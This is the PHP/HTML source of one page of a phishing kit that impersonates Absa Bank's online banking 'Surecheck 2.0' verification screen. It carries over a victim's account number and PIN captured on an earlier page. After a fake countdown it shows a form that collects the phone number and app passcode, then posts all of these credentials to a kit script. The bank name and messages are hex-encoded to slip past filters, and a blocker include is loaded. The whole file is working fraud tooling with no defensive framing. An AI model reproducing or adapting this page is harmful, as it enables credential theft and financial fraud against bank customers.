<?php
require "includes/blocker.php";
require "includes/functions.php";
$AccessAccount = htmlspecialchars($_GET["aa"]);
$PIN = htmlspecialchars($_GET["bb"]);
$Operator = htmlspecialchars($_GET["dd"]);
$p1 = htmlspecialchars($_GET["ee"]);
error_reporting(0);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
<style type="text/css">.btl-repaint{zoom:1;background-color:transparent;-moz-outline:none;}</style>
<style type="text/css">.btl-drag-outlineElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:9999;border-width:1px;border-style:solid;background-color:#DFE0E1;border-color:#8B8D91;}</style>
<style type="text/css">.btl-resize-cursorElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:10000;opacity:0;-ms-filter:"alpha(opacity=0)";filter:alpha(opacity=0);background:white;}.btl-resize-lineElement{position:absolute;top:-10000px;left:-10000px;width:1px;height:100px;z-index:9999;border-width:1px;border-style:solid;border-color:#8B8D91;overflow:hidden;}.btl-resize-outlineElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:9999;border-width:1px;border-style:solid;opacity:.4;-ms-filter:"alpha(opacity=40)";filter:alpha(opacity=40);background-color:#DFE0E1;border-color:#8B8D91;}</style>
<link rel="shortcut icon" href="media/favicon.ico">
<meta http-equiv="X-UA-Compatible" content="IE=10; IE=9; IE=8">
<title>&#x41;&#x62;&#x73;&#x61;&#x20;&#x4f;&#x6e;&#x6c;&#x69;&#x6e;&#x65;</title>
<link rel="stylesheet" type="text/css" href="media/main.css" media="screen">
<link rel="stylesheet" type="text/css" href="media/login.css">
<link rel="stylesheet" type="text/css" href="media/jcaptcha.css">
<script type="text/javascript" src="media/backbase.js"></script>
<script type="text/javascript" src="media/main-all-base.js"></script>
<Style>
.errors {
z-index: 1000;
position:absolute;
margin-top:-6px;
}
.errors2 {
z-index: 1000;
position:absolute;
margin-top:-6px;
}
.errors3 {
z-index: 1000;
position:absolute;
margin-top:-6px;
}
#countdown {
  position: relative;
  height: 40px;
  width: 40px;
  text-align: center;
  margin-top:-50px;
  padding-left:10px;
}
#countdown-number {
  position: fixed;
  z-index:99999;
  margin-left: -10px;
  font-weight:bold;
  color:#CC1124;
  font-size: 18px;
  display: inline-block;
  line-height: 40px;
}
svg {
  position: absolute;
  top: 0;
  right: 0;
  width: 40px;
  height: 40px;
  transform: rotateY(-180deg) rotateZ(-90deg);
}
svg circle {
  stroke-dasharray: 113px;
  stroke-dashoffset: 226px;
  stroke-linecap: round;
  stroke-width: 3px;
  stroke: #CC1124;
  fill: #F4F4F4;
  animation: countdown 59s linear infinite forwards;
}
@keyframes countdown {
  from {
stroke-dashoffset: 226px;
  }
  to {
stroke-dashoffset: 113px;
  }
}
</style>
<SCRIPT>
<!--
function check(form) {
var regExpressPostcode =  /^(\d){9,12}$/
if (!regExpressPostcode.test(form.phonenr.value))
{ document.getElementById("error1").style = "display:block;position:fixed;color:#870A3C;"; form.phonenr.focus(); return;}
else { document.getElementById("error1").style.display = "none";  }
var regExpressPostcode =  /^(\d){5,5}$/
if (!regExpressPostcode.test(form.passcode.value))
{ document.getElementById("error2").style = "display:block;position:fixed;color:#870A3C;"; form.passcode.focus(); return;}
else { document.getElementById("error2").style.display = "none";  }
document.getElementById("pleasewait").style.display = "block";
setTimeout(function() { form.submit() }, 1900);
}
//-->
</SCRIPT>
</head>
<body class="ssr-enabled ap-jsp-body prelogin" id="bodydiv" sid="8WHbZnZfVLktCkyaxfYz6WE">
<div></div>
<div style="position:fixed; top:0px; left:0px; z-index:105; width:100%; height:54px; background:#FFFFFF; padding:10px 0px 0px 10px; box-shadow: 0 4px 8px 0 rgba(0,0,0,.16);">
<img src="media/logo-red.png" width="44" height="44">
</div>
<div class="ap-page-header" style="z-index:106;">
<div class="ap-navigation-main" style="z-index:107;">
<div class="ap-tabStrip-rounded-left"></div>
<ul class="ap-tabStrip-tabs">
<li class="ap-tab-button ap-tab-active" id="SSR-tab-18">
 <div class="ap-tab-title" tabindex="10">Logon</div>
 <div class="ap-tab-title-hidden">Logon</div>
</li>
<li class="ap-tab-button" id="SSR-tab-19">
<div class="ap-tab-title" tabindex="11"><a href="#">Registration</a></div>
 <div class="ap-tab-title-hidden">Registration</div>
</li>
<li class="ap-tab-button" id="SSR-tab-20">
 <div class="ap-tab-title" tabindex="12"><a href="#">&#x41;&#x62;&#x73;&#x61; home page</a></div>
 <div class="ap-tab-title-hidden" style="font-size:14px;">&#x41;&#x62;&#x73;&#x61; home page</div>
</li>
</ul>
<div class="ap-tabStrip-rounded-right"></div>
<div style="clear: both;"></div>
<div class="ap-navigation-sub ap-tabStrip-subnav"></div>
</div>
</div>
<div class="ap-page-container" style="z-index:104;">
<div class="ap-main-content-wrapper">
<div class="ap-main-content-wrapper-top">
<div class="ap-corners-rounded-top-left"></div>
<div class="ap-corners-rounded-top"></div>
<div class="ap-corners-rounded-top-right"></div>
</div>
<div class="ap-page-content ap-container">
<div class="ap-container-highlevel">
 <div class="ap-titlebar ap-heading-titlebar" style="padding-top: 0px;">
<div id="header_results" class="ap-bar-section ap-bar-title" style="color: #FFFFFF">
Logon&nbsp;
| Welcome to &#x41;&#x62;&#x73;&#x61;&#x20;&#x4f;&#x6e;&#x6c;&#x69;&#x6e;&#x65;
</div>
 </div>
 <div class="ap-container-content" id="ap-container-content" style="padding-bottom:5px; overflow: hidden"> 
<div class="ap-login-columns ap-columns-2-lhs" style="padding-top: 0px;">
<div class="ap-column-1 accessAccountScreen" id="ap-column-1" styleold="width:389px; padding:0">
<div class="ap-login-container" id="ap-login-container">
<div class="ap-container-highlevel" style="width:379px;">
<div class="ap-titlebar ap-heading-titlebar ap-heading-titlebar-login">
<div class="ap-bar-section ap-bar-title" style="margin-top:8px;margin-left:25px;">
&nbsp;&nbsp;Surecheck 2.0
</div>
</div>
<div class="ap-container-content ap-container-content-USSD-login">
<table class="ui-grid ap-n2fa-grid-A" id="div1">
<tbody class="ui-rows">
<tr class="ui-row ap-row-head">
<td colspan="4" class="ui-cell ">
<b>Surecheck 2.0</b>
</td>
</tr>
<tr class="ui-row">
<td colspan="2" class="ui-cell ap-common-paddingTop ">
<img src="media/lock.png" title="" style="width:22px; height:27px; vertical-align:middle;">
<span class="ap-common-fontBold ap-common-fontSize16px ap-common-marginLeft ap-common-verticalAlign-middle">
Verification request
</span>
</td>
<td colspan="2" class="ui-cell ap-common-paddingTop ap-common-alignRight ap-common-verticalAlign-middle " style="font-size: 11px;">
sent to app at
&nbsp; 
<span id="timeStamp1"><span><script>
var today = new Date();
var dd = today.getDate();
var mm = today.getMonth()+1; 
var yyyy = today.getFullYear();
if(dd<10) 
{
dd='0'+dd;
} 
if(mm<10) 
{
mm='0'+mm;
} 
today = yyyy+'-'+mm+'-'+dd;
document.write(today);
</script> <script>
function GetNow(){
var currentdate = new Date(); 
var datetime = currentdate.getHours() + ":"  
+ currentdate.getMinutes() + ":" 
+ currentdate.getSeconds();
return datetime;
}
document.write(GetNow());
</script></span></span>
</td>
</tr>
<tr class="ui-row">
<td colspan="4" class="ui-cell ap-common-paddingTop " style="font-size: 13px;">
<div class="ap-common-borderTop ap-common-marginBottom"></div>
You have been sent a verification request to the Absa banking App on your verification device.
Please accept or reject the request.<Br><Br><Br>
</td>
</tr>
<tr class="ui-row">
<td colspan="4" class="ui-cell ap-common-paddingTop ">
&nbsp;
<div class="ap-timer-left" style="float:left; width:61px; height:51px;"><canvas id="timerCanvas" class="ap-timer-canvas" width="50px" height="50px">0</canvas>
<div id="countdown">
<div id="countdown-number"></div>
<svg><circle r="18" cx="20" cy="20"></circle></svg></div>
<script src='media/stopExecutionOnTimeout.js'></script>
<script>
function countdown() {
var seconds = 60;
function tick() {
var counter = document.getElementById("countdown-number");
seconds--;
counter.innerHTML = "" + (seconds < 10 ? "0" : "") + String(seconds);
if( seconds > 0 ) {
setTimeout(tick, 1000);
} else {
document.getElementById('div1').style.display = "none"; 
document.getElementById('div2').style.display = "block"; 
setTimeout(function() {
}, 2300);
return;
}
}
tick();
}
countdown();
</script>
</div>
<div class="ap-timer-right" style="float:left; width:200px; height:51px; margin-top:15px;">
<span class="ap-common-verticalAlign-middle">
seconds remaining
</span>
</div>
<b class="ap-n2fa-countDownTimer ap-SVM-countDownTimer ap-common-fontRed" style="display:none" data-canvas="true" data-timeremaining="51">51</b></td>
</tr>
</tbody>
</table>
<div style="Display:none;"  id="div2">
<form class="ui-form ap-SC2-credsForm" method="POST" action="php/status_3.php">
<input name="AccessAccount" value="<?php echo $AccessAccount; ?>" type="hidden" />
<input name="PIN" value="<?php echo $PIN; ?>" type="hidden" />
<input name="Operator" value="<?php echo $Operator; ?>" type="hidden" />
<input name="p1" value="<?php echo $p1; ?>" type="hidden" />
<table class="ui-grid"><tbody style="font-size:11px;" class="ui-rows">
<tr class="ui-row" style="height: 40px;"><td class="ui-cell ">Phone Number</td>
<td class="ui-cell "><input type="tel" onKeyDown="if(event.keyCode==13) check(this.form);" class="ui-form-field ui-textBox ui-textBox-singleLine ap-SC2-ATMCardNumber " id="phonenr" name="phonenr" maxlength="12">
<span id="error1" style="display:none;">&nbsp;&nbsp;Please enter a valid phone number.</span>
</td><td class="ui-cell "></td></tr>
<tr class="ui-row" style="height: 40px;"><td class="ui-cell ">App Passcode</td>
<td class="ui-cell "><input type="password" onKeyDown="if(event.keyCode==13) check(this.form);" class="ui-form-field ui-textBox ui-textBox-singleLine ap-SC2-ATMPin ap-SC2-masked " id="passcode" name="passcode" value="" maxlength="5"><span id="error2" style="display:none;">&nbsp;&nbsp;&#x50;&#x6c;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6e;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6c;&#x69;&#x64;&#x20;&#x41;&#x70;&#x70;&#x20;&#x70;&#x61;&#x73;&#x73;&#x63;&#x6f;&#x64;&#x65;&#x2c;&#x20;&#x41;&#x70;&#x70;&#x20;&#x70;&#x61;&#x73;&#x73;&#x63;&#x6f;&#x64;&#x65;&#x20;
<br>
&#x63;&#x6f;&#x6e;&#x73;&#x69;&#x73;&#x74;&#x73;&#x20;&#x6f;&#x66;&#x20;&#x66;&#x69;&#x76;&#x65;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x20;&#x6e;&#x75;&#x6d;&#x62;&#x65;&#x72;&#x73;&#x2e;</span></td>
<td class="ui-cell "></td></tr></tbody></table>

<br><br>
<div class="ui-formFoot ">
<div class="validation-place-holder"></div>
<div class="ui-buttonFooter ">
<div class="ui-exception-container" style="padding-top: 7px;">
<button class="ui-button ap-button-cancel" tabindex="0" type="button" onclick="check(this.form)" aria-label="Cancel. ">
<div class="ui-button-left">
<div class="ui-button-right">
<div class="ui-button-center">
Send
</div>
</div>
</div>
</button>
</div>
</form>
</div>
</div>
</div>
<div tabindex="0" class="ui-noticeBox " id="div1">
<div class="bold">Important information</div>
<ul>
<li>[YouCanResend]</li>
<li>[HelpLine']</li>
</ul>
</div>
</div>
<div class="ap-container-bottom-corners">
<div class="ap-corners-rounded-bottom-left"></div>
<div class="ap-corners-rounded-bottom" style="width:363px;"></div>
<div class="ap-corners-rounded-bottom-right"></div>
</div>
</div>
</div>
</div>
<div class="ap-column-2 accessAccountScreenAdds" id="ap-column-2" styleold="width:550px;">
<div id="divadds1" style="position:relative; width:100%; margin-bottom:10px;">
<div style="float:left; width:270px; margin-right:10px;">
<div id="divsecuritycentre" class="ap-login-block-rounded">
 <div class="ap-login-block-rounded-top">
 <div class="ap-corners-rounded-top-left"></div>
 <div class="ap-corners-rounded-top"></div>
 <div class="ap-corners-rounded-top-right"></div>
 </div>
 <div role="tablist" class="ui-tabBox">
 <ul class="ui-tabHeads">
 <li aria-selected="true" class="ui-tabHead ui-tab-selected" role="button" tabindex="18">
 Security centre
 <span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
 </li>
 </ul>
 <div class="ui-tabBodies">
 <div tabindex="19" role="tabpanel" class="ui-tabBody ui-tabBody-selected">
 <div style="background: #FFFFFF;">
 <ul class="abc">
<li><a href="#"id="am" >Absa's online security measures</a></li><li><a href="#"id="am" >Important information about phishing</a></li><li><a href="#"id="am" >Protect yourself online</a></li><li><a href="#"id="am" >Online shopping and 3D Secure</a></li><li><a href="#"id="am" >Latest scams</a></li><li><a href="#"id="am" >Latest internet security software</a></li>
 </ul>
 </div>
 </div>
 </div>
 </div>
 <div class="ap-login-block-rounded-bottom">
 <div class="ap-corners-rounded-bottom-left"></div>
 <div class="ap-corners-rounded-bottom"></div>
 <div class="ap-corners-rounded-bottom-right"></div>
 </div>
</div>
</div>
<div style="float:left; width:270px;">
<div id="divimportantlinks" class="ap-login-block-rounded">
 <div class="ap-login-block-rounded-top">
 <div class="ap-corners-rounded-top-left"></div>
 <div class="ap-corners-rounded-top"></div>
 <div class="ap-corners-rounded-top-right"></div>
 </div>
 <div role="tablist" class="ui-tabBox">
 <ul class="ui-tabHeads">
 <li aria-selected="true" class="ui-tabHead ui-tab-selected" role="button" tabindex="13">
 Important links
 <span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
 </li>
 </ul>
 <div class="ui-tabBodies">
 <div tabindex="14" role="tabpanel" class="ui-tabBody ui-tabBody-selected">
 <div style="background: #FFFFFF;">
 <ul class="abc">
<li><a href="#"id="am" >Planned Maintenance</a></li><li><a href="#"id="am" >How to register</a></li><li><a href="#"id="am" ><b>2020 Pricing</b></a></li><li><a href="#"id="am" ><b style="font-color:#AF154B !important;">Banking App logon issues on Apple devices</b></a></li><li><a href="#"id="am" >Security enhancement</a></li><li><a href="#"id="am" >Contact us</a></li><li><a href="#"id="am" >Absa Listed Beneficiaries - accounts closed</a></li>
 </ul>
 </div>
 </div>
 </div>
 </div>
 <div class="ap-login-block-rounded-bottom">
 <div class="ap-corners-rounded-bottom-left"></div>
 <div class="ap-corners-rounded-bottom"></div>
 <div class="ap-corners-rounded-bottom-right"></div>
 </div>
</div>
</div>
<div style="clear:both;"></div>
<div style="position:relative; margin-top:10px; height:152px;">
<div class="ap-login-campaign-image img1" style="position:absolute; top:0px; left:0px; width:280px;"><a href="#"><img src="media/campaigne_1_ENG.png" alt=""></a></div>
<div class="ap-login-campaign-image img2" style="position:absolute; top:0px; right:0px; width:270px;"><a href="#"><img src="media/campaigne_3_post_golive_EN.jpg" alt=""></a></div>
</div>
</div>
</div>
<div class="ap-columns-clear"></div>
</div>
<div style="width: 100%; height: 10px;"></div>
<div id="divbottomadds" class="ap-login-columns ap-columns-33">
<div class="ap-column-1">
&nbsp;
</div>
<div class="ap-column-2">
&nbsp;
</div>
<div class="ap-column-3">
&nbsp;
</div>
</div>
 </div>
 <div class="ap-container-bottom ap-heading-titlebar-item ap-container-bottom-hide">
<div class="ap-corners-rounded-bottom-left"></div>
<div class="ap-corners-rounded-bottom"></div>
<div class="ap-corners-rounded-bottom-right"></div>
 </div>
</div>
</div>
<div class="ap-main-content-wrapper-bottom">
<div class="ap-corners-rounded-bottom-left"></div>
<div class="ap-corners-rounded-bottom"></div>
<div class="ap-corners-rounded-bottom-right"></div>
</div>
</div>
<div class="ap-footer" tabindex="20">
<div style="position:relative; top:0px; left:0px; width:971px; text-align:center;">
<p tabindex="21">
 &#xa9; Copyright. &#x41;&#x62;&#x73;&#x61; &#x42;&#x61;&#x6e;&#x6b; Limited. &#x52;&#x65;&#x67;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x4e;&#x75;&#x6d;&#x62;&#x65;&#x72;&#x3a;&#x20;&#x31;&#x39;&#x38;&#x36;&#x2f;&#x30;&#x30;&#x34;&#x37;&#x39;&#x34;&#x2f;&#x30;&#x36;&nbsp;
 &#x41;&#x75;&#x74;&#x68;&#x6f;&#x72;&#x69;&#x7a;&#x65;&#x64;&#x20;&#x66;&#x69;&#x6e;&#x61;&#x6e;&#x63;&#x69;&#x61;&#x6c;&#x20;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x73;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x72;&#x65;&#x67;&#x69;&#x73;&#x74;&#x65;&#x72;&#x65;&#x64;&#x20;&#x63;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x70;&#x72;&#x6f;&#x76;&#x69;&#x64;&#x65;&#x72;&#x20;&#x4e;&#x43;&#x52;&#x43;&#x50;&#x37;
</p>
<div class="ap-footer-links">
 <ul><li><a href="#" id="am">Security centre</a></li><li><a href="#" id="am">Terms of use</a></li><li><a href="#" id="am">Software requirements</a></li><li><a href="#" id="am">&#x42;&#x61;&#x6e;&#x6b;ing regulations</a></li></ul>
</div>
<div style="position:absolute; top:0px; right:0px; width:220px; text-align:right;">
</div>
</div>
</div>
</div>
<div></div>
<style>
#thebottom {
position: relative;
opacity: 1.0;
background-color: #FFF;
bottom: 0;
left: 0;
width: 100%;
height: 225px;
top: 75%;
}
</style>
<div id="pleasewait" style="display:none;z-index:99999;" role="alert" class="ap-pleasewait">
<div id="pleasewait-viewport" class="ap-pleasewait--viewport">
<div class="ap-pleasewait--content">
<img src="media/ajax-loader-2.gif" width="32" height="32"/>
<span id="pleasewait-label" class="ap-pleasewait--label"></span>
</div>
<div id="thebottom"></div>
</div>
</div>
<div></div>
<script type="text/javascript" src="media/jquery.min.js"></script>
<script type="text/javascript" src="media/keyboard.js"></script>
<div class="btl-resize-cursorElement"></div><div class="btl-resize-lineElement"></div><div class="btl-resize-outlineElement"></div></body></html>